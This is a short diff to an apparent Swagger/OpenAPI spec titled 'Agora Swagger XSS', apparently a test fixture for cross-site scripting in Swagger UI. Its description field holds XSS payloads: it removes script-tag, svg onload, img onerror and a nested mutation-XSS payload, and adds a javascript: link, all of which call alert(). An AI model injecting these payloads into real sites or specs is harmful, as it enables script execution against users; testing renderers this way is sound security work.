@@ -4,7 +4,4 @@ info:
   title: Agora Swagger XSS
   description:
     <h4>xss</h4>
-    <script>alert(document.domain)</script>
-    <svg/onload=alert(1)>
-    <img src=x onerror="alert(1)">
-    xss<math><mi><table><mglyph><svg><mtext><textarea><a title="</textarea><iframe onload='alert(document.domain)'>"></a></textarea></mtext></svg></mglyph></table></mi></math>
+   <a href="javascript:alert(1)">test</a>
